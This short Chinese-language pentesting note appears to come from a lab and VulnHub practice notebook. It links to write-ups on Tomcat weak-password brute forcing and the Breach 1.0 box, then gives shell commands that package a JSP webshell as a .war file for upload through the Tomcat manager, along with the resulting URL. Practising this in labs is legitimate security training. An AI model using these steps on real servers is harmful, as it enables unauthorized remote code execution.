[干货 | Tomcat弱口令爆破+War包部署Getshell靶场实战](https://mp.weixin.qq.com/s/THmJK56SIeWoJZrq3Aowiw)
[Done | vulnhub |1-Breach1.0（端口、cms、sql注入、keystore,keytool,ssl证书解密pcap,tomcat后台shell、nc反弹）, tomcat证书问题用burp代理访问](https://mp.weixin.qq.com/s/iYsRfk1Bi_lOumc4L-V_4g) [1](https://www.cnblogs.com/zhuxr/p/9848230.html)

### Exploit/CVE/实战漏洞/Tomcat后台get shell
jsp马打成 .zip 改为 .war
```shell
zip -r shell.zip shell.jsp
cp shell.zip shell.war
```
上传后 地址为 /shell 则访问 /shell/shell.jsp
